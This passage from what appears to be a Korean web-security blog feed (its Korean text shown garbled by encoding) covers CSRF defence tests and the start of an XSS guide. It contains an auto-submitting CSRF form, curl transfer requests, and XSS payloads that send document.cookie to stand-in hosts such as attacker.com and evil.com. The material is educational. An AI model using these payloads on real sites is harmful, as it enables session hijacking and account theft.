class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// í˜ì´ì§€ ë¡œë“œ ì‹œ ìë™ ì œì¶œ</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;attackForm&#x27;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ë°©ì–´-í™•ì¸-ë°©ë²•"><a href="#ë°©ì–´-í™•ì¸-ë°©ë²•" class="headerlink" title="ë°©ì–´ í™•ì¸ ë°©ë²•"></a>ë°©ì–´ í™•ì¸ ë°©ë²•</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. CSRF í† í° ì—†ì´ ìš”ì²­</span></span><br><span class="line">curl -X POST https://bank.com/api/transfer \</span><br><span class="line">  -H <span class="string">&quot;Cookie: session_id=abc123&quot;</span> \</span><br><span class="line">  -d <span class="string">&quot;to=attacker&amp;amount=10000&quot;</span></span><br><span class="line"><span class="comment"># ê¸°ëŒ€ ê²°ê³¼: 403 Forbidden</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. ì˜ëª»ëœ CSRF í† í°ìœ¼ë¡œ ìš”ì²­</span></span><br><span class="line">curl -X POST https://bank.com/api/transfer \</span><br><span class="line">  -H <span class="string">&quot;Cookie: session_id=abc123&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-CSRF-TOKEN: invalid_token&quot;</span> \</span><br><span class="line">  -d <span class="string">&quot;to=attacker&amp;amount=10000&quot;</span></span><br><span class="line"><span class="comment"># ê¸°ëŒ€ ê²°ê³¼: 403 Forbidden</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. ì˜¬ë°”ë¥¸ CSRF í† í°ìœ¼ë¡œ ìš”ì²­</span></span><br><span class="line">curl -X POST https://bank.com/api/transfer \</span><br><span class="line">  -H <span class="string">&quot;Cookie: session_id=abc123&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-CSRF-TOKEN: valid_token_xyz&quot;</span> \</span><br><span class="line">  -d <span class="string">&quot;to=recipient&amp;amount=1000&quot;</span></span><br><span class="line"><span class="comment"># ê¸°ëŒ€ ê²°ê³¼: 200 OK</span></span><br></pre></td></tr></table></figure><h2 id="âœ…-ì²´í¬ë¦¬ìŠ¤íŠ¸"><a href="#âœ…-ì²´í¬ë¦¬ìŠ¤íŠ¸" class="headerlink" title="âœ… ì²´í¬ë¦¬ìŠ¤íŠ¸"></a>âœ… ì²´í¬ë¦¬ìŠ¤íŠ¸</h2><ul><li><input disabled="" type="checkbox"> ëª¨ë“  ìƒíƒœ ë³€ê²½ ìš”ì²­(POST&#x2F;PUT&#x2F;DELETE)ì— CSRF ë³´í˜¸ ì ìš©</li><li><input disabled="" type="checkbox"> SameSite ì¿ í‚¤ ì†ì„± ì„¤ì • (ìµœì†Œ Lax)</li><li><input disabled="" type="checkbox"> HTTPS ì‚¬ìš© ê°•ì œ</li><li><input disabled="" type="checkbox"> Referer&#x2F;Origin í—¤ë” ê²€ì¦</li><li><input disabled="" type="checkbox"> CORS ì •ì±… ì—„ê²©íˆ ì„¤ì •</li><li><input disabled="" type="checkbox"> GET ìš”ì²­ìœ¼ë¡œ ìƒíƒœ ë³€ê²½í•˜ì§€ ì•ŠìŒ</li><li><input disabled="" type="checkbox"> ë¯¼ê°í•œ ì‘ì—…ì€ ì¬ì¸ì¦ ìš”êµ¬ (ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ ë“±)</li></ul><h2 id="ğŸ“-ê²°ë¡ "><a href="#ğŸ“-ê²°ë¡ " class="headerlink" title="ğŸ“ ê²°ë¡ "></a>ğŸ“ ê²°ë¡ </h2><p>CSRFëŠ” <strong>ë¸Œë¼ìš°ì €ì˜ ì¿ í‚¤ ìë™ ì „ì†¡ íŠ¹ì„±</strong>ì„ ì•…ìš©í•œ ê³µê²©ì…ë‹ˆë‹¤.</p><p><strong>í•µì‹¬ ë°©ì–´ ì „ëµ:</strong></p><ol><li>CSRF Token ë˜ëŠ” Double Submit Cookie ì‚¬ìš©</li><li>SameSite ì¿ í‚¤ ì†ì„± ì„¤ì •</li><li>CORS ì •ì±… ì—„ê²©íˆ ê´€ë¦¬</li><li>GET ìš”ì²­ìœ¼ë¡œ ìƒíƒœ ë³€ê²½ ê¸ˆì§€</li></ol><p>ë‹¨ì¼ ë°©ì–´ ê¸°ë²•ë³´ë‹¤ëŠ” <strong>ì—¬ëŸ¬ ê¸°ë²•ì„ ì¡°í•©</strong>í•˜ì—¬ ë‹¤ì¸µ ë°©ì–´(Defense in Depth)ë¥¼ êµ¬ì¶•í•˜ëŠ” ê²ƒì´ ê°€ì¥ ì•ˆì „í•©ë‹ˆë‹¤.</p>]]></content:encoded>
      
      
      <category domain="https://ckck803.github.io/categories/Security/">Security</category>
      
      
      <category domain="https://ckck803.github.io/tags/CSRF/">CSRF</category>
      
      <category domain="https://ckck803.github.io/tags/Web-Security/">Web Security</category>
      
      <category domain="https://ckck803.github.io/tags/XSS/">XSS</category>
      
      <category domain="https://ckck803.github.io/tags/Token/">Token</category>
      
      
      <comments>https://ckck803.github.io/2025/12/04/security/csrf/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Web Security] XSS ê³µê²©ê³¼ ë°©ì–´ ê¸°ë²• ì™„ë²½ ê°€ì´ë“œ</title>
      <link>https://ckck803.github.io/2025/12/04/security/xss/</link>
      <guid>https://ckck803.github.io/2025/12/04/security/xss/</guid>
      <pubDate>Wed, 03 Dec 2025 15:00:00 GMT</pubDate>
      
      <description>&lt;h2 id=&quot;ğŸ¯-XSS-Cross-Site-Scripting-ë€&quot;&gt;&lt;a href=&quot;#ğŸ¯-XSS-Cross-Site-Scripting-ë€&quot; class=&quot;headerlink&quot; title=&quot;ğŸ¯ XSS(Cross-Site Scripting)ë€?&quot;&gt;&lt;/a&gt;ğŸ¯ XSS(Cross-Site Scripting)ë€?&lt;/h2&gt;&lt;p&gt;XSSëŠ” &lt;strong&gt;ê³µê²©ìê°€ ì›¹ í˜ì´ì§€ì— ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚½ì…&lt;/strong&gt;í•˜ì—¬ ë‹¤ë¥¸ ì‚¬ìš©ìì˜ ë¸Œë¼ìš°ì €ì—ì„œ ì‹¤í–‰ì‹œí‚¤ëŠ” ê³µê²©ì…ë‹ˆë‹¤.&lt;br&gt;ì‚¬ìš©ìì˜ ì¿ í‚¤, ì„¸ì…˜ í† í°ì„ íƒˆì·¨í•˜ê±°ë‚˜, ì‚¬ìš©ìì¸ ì²™ í–‰ë™í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;
&lt;h3 id=&quot;XSS-vs-CSRF-ì°¨ì´ì &quot;&gt;&lt;a href=&quot;#XSS-vs-CSRF-ì°¨ì´ì &quot; class=&quot;headerlink&quot; title=&quot;XSS vs CSRF ì°¨ì´ì &quot;&gt;&lt;/a&gt;XSS vs CSRF ì°¨ì´ì &lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;êµ¬ë¶„&lt;/th&gt;
&lt;th&gt;XSS&lt;/th&gt;
&lt;th&gt;CSRF&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;ê³µê²© ëŒ€ìƒ&lt;/td&gt;
&lt;td&gt;ì›¹ì‚¬ì´íŠ¸ì˜ &lt;strong&gt;ì‚¬ìš©ì&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;ì›¹ì‚¬ì´íŠ¸ì˜ &lt;strong&gt;ì„œë²„&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ê³µê²© ë°©ì‹&lt;/td&gt;
&lt;td&gt;ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ &lt;strong&gt;ì‹¤í–‰&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;ì‚¬ìš©ì ê¶Œí•œìœ¼ë¡œ &lt;strong&gt;ìš”ì²­ ì „ì†¡&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ì£¼ìš” ìˆ˜ë‹¨&lt;/td&gt;
&lt;td&gt;JavaScript ì£¼ì…&lt;/td&gt;
&lt;td&gt;ìë™ í¼ ì œì¶œ, ì´ë¯¸ì§€ íƒœê·¸&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;íƒˆì·¨ ê°€ëŠ¥&lt;/td&gt;
&lt;td&gt;ì¿ í‚¤, ì„¸ì…˜, DOM, í‚¤ ì…ë ¥ ë“±&lt;/td&gt;
&lt;td&gt;ë¶ˆê°€ëŠ¥ (ìš”ì²­ë§Œ ê°€ëŠ¥)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h2 id=&quot;ğŸ”-XSS-ê³µê²©-ìœ í˜•&quot;&gt;&lt;a href=&quot;#ğŸ”-XSS-ê³µê²©-ìœ í˜•&quot; class=&quot;headerlink&quot; title=&quot;ğŸ” XSS ê³µê²© ìœ í˜•&quot;&gt;&lt;/a&gt;ğŸ” XSS ê³µê²© ìœ í˜•&lt;/h2&gt;&lt;h3 id=&quot;1-Stored-XSS-ì €ì¥í˜•&quot;&gt;&lt;a href=&quot;#1-Stored-XSS-ì €ì¥í˜•&quot; class=&quot;headerlink&quot; title=&quot;1. Stored XSS (ì €ì¥í˜•)&quot;&gt;&lt;/a&gt;1. Stored XSS (ì €ì¥í˜•)&lt;/h3&gt;&lt;p&gt;ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ê°€ &lt;strong&gt;ì„œë²„ ë°ì´í„°ë² ì´ìŠ¤ì— ì €ì¥&lt;/strong&gt;ë˜ì–´, í•´ë‹¹ í˜ì´ì§€ë¥¼ ë³´ëŠ” ëª¨ë“  ì‚¬ìš©ìì—ê²Œ ì‹¤í–‰ë©ë‹ˆë‹¤.&lt;br&gt;&lt;strong&gt;ê°€ì¥ ìœ„í—˜í•œ&lt;/strong&gt; XSS ê³µê²©ì…ë‹ˆë‹¤.&lt;/p&gt;
&lt;h4 id=&quot;ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤&quot;&gt;&lt;a href=&quot;#ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤&quot; class=&quot;headerlink&quot; title=&quot;ê³µê²© ì‹œë‚˜ë¦¬ì˜¤&quot;&gt;&lt;/a&gt;ê³µê²© ì‹œë‚˜ë¦¬ì˜¤&lt;/h4&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// ê²Œì‹œíŒ ëŒ“ê¸€ ì‘ì„±&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; comment = &lt;span class=&quot;string&quot;&gt;&amp;#x27;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;  fetch(&amp;quot;https://attacker.com/steal?cookie=&amp;quot; + document.cookie);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;lt;/script&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// ì„œë²„ì— ì €ì¥ë¨&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// DB: comments í…Œì´ë¸”ì— ìœ„ ìŠ¤í¬ë¦½íŠ¸ê°€ ê·¸ëŒ€ë¡œ ì €ì¥&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// ë‹¤ë¥¸ ì‚¬ìš©ìê°€ ê²Œì‹œê¸€ì„ ë³¼ ë•Œ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;language-xml&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;comment&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;language-xml&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;language-javascript&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;language-xml&quot;&gt;    &lt;span class=&quot;title function_&quot;&gt;fetch&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;https://attacker.com/steal?cookie=&amp;quot;&lt;/span&gt; + &lt;span class=&quot;variable language_&quot;&gt;document&lt;/span&gt;.&lt;span class=&quot;property&quot;&gt;cookie&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;language-xml&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;language-xml&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// âš ï¸ ëª¨ë“  ë°©ë¬¸ìì˜ ì¿ í‚¤ê°€ íƒˆì·¨ë¨!&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&quot;ì‹¤ì œ-ì‚¬ë¡€&quot;&gt;&lt;a href=&quot;#ì‹¤ì œ-ì‚¬ë¡€&quot; class=&quot;headerlink&quot; title=&quot;ì‹¤ì œ ì‚¬ë¡€&quot;&gt;&lt;/a&gt;ì‹¤ì œ ì‚¬ë¡€&lt;/h4&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="ğŸ¯-XSS-Cross-Site-Scripting-ë€"><a href="#ğŸ¯-XSS-Cross-Site-Scripting-ë€" class="headerlink" title="ğŸ¯ XSS(Cross-Site Scripting)ë€?"></a>ğŸ¯ XSS(Cross-Site Scripting)ë€?</h2><p>XSSëŠ” <strong>ê³µê²©ìê°€ ì›¹ í˜ì´ì§€ì— ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚½ì…</strong>í•˜ì—¬ ë‹¤ë¥¸ ì‚¬ìš©ìì˜ ë¸Œë¼ìš°ì €ì—ì„œ ì‹¤í–‰ì‹œí‚¤ëŠ” ê³µê²©ì…ë‹ˆë‹¤.<br>ì‚¬ìš©ìì˜ ì¿ í‚¤, ì„¸ì…˜ í† í°ì„ íƒˆì·¨í•˜ê±°ë‚˜, ì‚¬ìš©ìì¸ ì²™ í–‰ë™í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h3 id="XSS-vs-CSRF-ì°¨ì´ì "><a href="#XSS-vs-CSRF-ì°¨ì´ì " class="headerlink" title="XSS vs CSRF ì°¨ì´ì "></a>XSS vs CSRF ì°¨ì´ì </h3><table><thead><tr><th>êµ¬ë¶„</th><th>XSS</th><th>CSRF</th></tr></thead><tbody><tr><td>ê³µê²© ëŒ€ìƒ</td><td>ì›¹ì‚¬ì´íŠ¸ì˜ <strong>ì‚¬ìš©ì</strong></td><td>ì›¹ì‚¬ì´íŠ¸ì˜ <strong>ì„œë²„</strong></td></tr><tr><td>ê³µê²© ë°©ì‹</td><td>ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ <strong>ì‹¤í–‰</strong></td><td>ì‚¬ìš©ì ê¶Œí•œìœ¼ë¡œ <strong>ìš”ì²­ ì „ì†¡</strong></td></tr><tr><td>ì£¼ìš” ìˆ˜ë‹¨</td><td>JavaScript ì£¼ì…</td><td>ìë™ í¼ ì œì¶œ, ì´ë¯¸ì§€ íƒœê·¸</td></tr><tr><td>íƒˆì·¨ ê°€ëŠ¥</td><td>ì¿ í‚¤, ì„¸ì…˜, DOM, í‚¤ ì…ë ¥ ë“±</td><td>ë¶ˆê°€ëŠ¥ (ìš”ì²­ë§Œ ê°€ëŠ¥)</td></tr></tbody></table><h2 id="ğŸ”-XSS-ê³µê²©-ìœ í˜•"><a href="#ğŸ”-XSS-ê³µê²©-ìœ í˜•" class="headerlink" title="ğŸ” XSS ê³µê²© ìœ í˜•"></a>ğŸ” XSS ê³µê²© ìœ í˜•</h2><h3 id="1-Stored-XSS-ì €ì¥í˜•"><a href="#1-Stored-XSS-ì €ì¥í˜•" class="headerlink" title="1. Stored XSS (ì €ì¥í˜•)"></a>1. Stored XSS (ì €ì¥í˜•)</h3><p>ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ê°€ <strong>ì„œë²„ ë°ì´í„°ë² ì´ìŠ¤ì— ì €ì¥</strong>ë˜ì–´, í•´ë‹¹ í˜ì´ì§€ë¥¼ ë³´ëŠ” ëª¨ë“  ì‚¬ìš©ìì—ê²Œ ì‹¤í–‰ë©ë‹ˆë‹¤.<br><strong>ê°€ì¥ ìœ„í—˜í•œ</strong> XSS ê³µê²©ì…ë‹ˆë‹¤.</p><h4 id="ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤"><a href="#ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤" class="headerlink" title="ê³µê²© ì‹œë‚˜ë¦¬ì˜¤"></a>ê³µê²© ì‹œë‚˜ë¦¬ì˜¤</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ê²Œì‹œíŒ ëŒ“ê¸€ ì‘ì„±</span></span><br><span class="line"><span class="keyword">const</span> comment = <span class="string">&#x27;&lt;script&gt;</span></span><br><span class="line"><span class="string">  fetch(&quot;https://attacker.com/steal?cookie=&quot; + document.cookie);</span></span><br><span class="line"><span class="string">&lt;/script&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ì„œë²„ì— ì €ì¥ë¨</span></span><br><span class="line"><span class="comment">// DB: comments í…Œì´ë¸”ì— ìœ„ ìŠ¤í¬ë¦½íŠ¸ê°€ ê·¸ëŒ€ë¡œ ì €ì¥</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ë‹¤ë¥¸ ì‚¬ìš©ìê°€ ê²Œì‹œê¸€ì„ ë³¼ ë•Œ</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;comment&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">fetch</span>(<span class="string">&quot;https://attacker.com/steal?cookie=&quot;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="comment">// âš ï¸ ëª¨ë“  ë°©ë¬¸ìì˜ ì¿ í‚¤ê°€ íƒˆì·¨ë¨!</span></span><br></pre></td></tr></table></figure><h4 id="ì‹¤ì œ-ì‚¬ë¡€"><a href="#ì‹¤ì œ-ì‚¬ë¡€" class="headerlink" title="ì‹¤ì œ ì‚¬ë¡€"></a>ì‹¤ì œ ì‚¬ë¡€</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- í”„ë¡œí•„ ì´ë¦„ í•„ë“œì— ìŠ¤í¬ë¦½íŠ¸ ì‚½ì… --&gt;</span></span><br><span class="line">ì´ë¦„: <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">  new Image().src=&#x27;https://evil.com/log?c=&#x27;+document.cookie</span></span></span><br><span class="line"><span class="string"><span class="tag">&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ê²Œì‹œê¸€ ì œëª© --&gt;</span></span><br><span class="line">ì œëª©: <span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ëŒ“ê¸€ ë‚´ìš© --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-Reflected-XSS-ë°˜ì‚¬í˜•"><a href="#2-Reflected-XSS-ë°˜ì‚¬í˜•" class="headerlink" title="2. Reflected XSS (ë°˜ì‚¬í˜•)"></a>2. Reflected XSS (ë°˜ì‚¬í˜•)</h3><p>ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ê°€ <strong>URL íŒŒë¼ë¯¸í„°ë‚˜ í¼ ì…ë ¥</strong>ì„ í†µí•´ ì¦‰ì‹œ ë°˜ì‚¬ë˜ì–´ ì‹¤í–‰ë©ë‹ˆë‹¤.<br>ì„œë²„ì— ì €ì¥ë˜ì§€ ì•Šìœ¼ë©°, í”¼ì‹± ë§í¬ë¥¼ í†µí•´ ì „íŒŒë©ë‹ˆë‹¤.</p><h4 id="ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤-1"><a href="#ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤-1" class="headerlink" title="ê³µê²© ì‹œë‚˜ë¦¬ì˜¤"></a>ê³µê²© ì‹œë‚˜ë¦¬ì˜¤</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ì·¨ì•½í•œ ê²€ìƒ‰ ê¸°ëŠ¥</span></span><br><span class="line"><span class="attr">https</span>:<span class="comment">//shop.com/search?q=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ì„œë²„ ì½”ë“œ (ì·¨ì•½)</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/search&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> query = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">`ê²€ìƒ‰ ê²°ê³¼: <span class="subst">$&#123;query&#125;</span>`</span>);  <span class="comment">// âš ï¸ ê·¸ëŒ€ë¡œ ì¶œë ¥</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ë Œë”ë§ ê²°ê³¼</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  ê²€ìƒ‰ ê²°ê³¼: <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h4 id="í”¼ì‹±-ê³µê²©-ì˜ˆì‹œ"><a href="#í”¼ì‹±-ê³µê²©-ì˜ˆì‹œ" class="headerlink" title="í”¼ì‹± ê³µê²© ì˜ˆì‹œ"></a>í”¼ì‹± ê³µê²© ì˜ˆì‹œ</h4><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ê³µê²©ìê°€ ì´ë©”ì¼ë¡œ ì „ì†¡í•˜ëŠ” ë§í¬:</span><br><span class="line">https://bank.com/login?redirect=&lt;script&gt;</span><br><span class="line">  document.location=&#x27;https://evil.com/phishing?cookie=&#x27;+document.cookie</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">ì‚¬ìš©ìê°€ í´ë¦­í•˜ë©´:</span><br><span class="line">1. ì€í–‰ ì‚¬ì´íŠ¸ì—ì„œ ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰</span><br><span class="line">2. ì¿ í‚¤ê°€ ê³µê²©ì ì„œë²„ë¡œ ì „ì†¡</span><br><span class="line">3. ê³µê²©ìê°€ ì„¸ì…˜ í•˜ì´ì¬í‚¹</span><br></pre></td></tr></table></figure><h3 id="3-DOM-based-XSS-DOM-ê¸°ë°˜"><a href="#3-DOM-based-XSS-DOM-ê¸°ë°˜" class="headerlink" title="3. DOM-based XSS (DOM ê¸°ë°˜)"></a>3. DOM-based XSS (DOM ê¸°ë°˜)</h3><p>ì„œë²„ë¥¼ ê±°ì¹˜ì§€ ì•Šê³  <strong>í´ë¼ì´ì–¸íŠ¸ ì¸¡ JavaScriptì—ì„œ</strong> ë°œìƒí•©ë‹ˆë‹¤.<br>URL Fragment(#)ë‚˜ DOM ì¡°ì‘ ì‹œ ë°œìƒí•©ë‹ˆë‹¤.</p><h4 id="ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤-2"><a href="#ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤-2" class="headerlink" title="ê³µê²© ì‹œë‚˜ë¦¬ì˜¤"></a>ê³µê²© ì‹œë‚˜ë¦¬ì˜¤</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ì·¨ì•½í•œ JavaScript ì½”ë“œ</span></span><br><span class="line"><span class="keyword">const</span> urlParams = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>);</span><br><span class="line"><span class="keyword">const</span> name = urlParams.<span class="title function_">get</span>(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;welcome&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">`í™˜ì˜í•©ë‹ˆë‹¤, <span class="subst">$&#123;name&#125;</span>ë‹˜!`</span>;</span><br><span class="line"><span class="comment">// âš ï¸ innerHTMLì— ì§ì ‘ ì‚½ì…</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ê³µê²© URL</span></span><br><span class="line"><span class="attr">https</span>:<span class="comment">//site.com/?name=&lt;img src=x onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ê²°ê³¼</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;welcome&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  í™˜ì˜í•©ë‹ˆë‹¤, <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span>ë‹˜!</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h4 id="ìœ„í—˜í•œ-DOM-API"><a href="#ìœ„í—˜í•œ-DOM-API" class="headerlink" title="ìœ„í—˜í•œ DOM API"></a>ìœ„í—˜í•œ DOM API</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// âŒ ìœ„í—˜í•œ ë°©ë²•ë“¤</span></span><br><span class="line">element.<span class="property">innerHTML</span> = userInput;</span><br><span class="line">element.<span class="property">outerHTML</span> = userInput;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(userInput);</span><br><span class="line"><span class="built_in">eval</span>(userInput);</span><br><span class="line"><span class="built_in">setTimeout</span>(userInput, <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Function</span>(userInput);</span><br><span class="line"></span><br><span class="line"><span class="comment">// âœ… ì•ˆì „í•œ ëŒ€ì•ˆ</span></span><br><span class="line">element.<span 